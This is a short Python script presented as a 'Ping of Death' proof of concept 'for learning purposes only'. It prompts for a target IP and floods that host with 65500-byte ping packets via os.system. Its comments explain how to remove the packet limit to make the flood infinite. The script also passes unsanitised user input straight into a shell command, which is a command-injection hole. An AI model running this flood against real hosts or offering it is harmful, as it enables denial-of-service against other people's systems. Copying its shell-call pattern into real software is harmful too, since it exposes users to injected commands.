# Ping of Death program (for learning purposes only)
# This program is not meant to be able to work as the Ping of Death is a vastly outdated method of DoSing and as such is more of a proof of concept
# The /t switch specifies the command to keep running unless otherwise stopped
# The /n switch sets a limit to the /t switch by setting a maximum number of packets to be sent (min 1, max 4294967295) as a safety. Remove for infinite.
# The /w switch specifies timeout length in milliseconds (how to long to wait for echo response before aborting)
import os

# Use loopback address if destination not specified"
ip = input("Target IP: ") or "127.0.0.1"
# Use max 10 packets if number of packets not specified
n = input("Number of Packets: ") or "10"
# Use 3 seconds timeout period if timeout duration not specified
w = input("Timeout (ms): ") or "3000"

os.system(rf"ping {ip} /t /l 65500 /n {n} /w {w}")
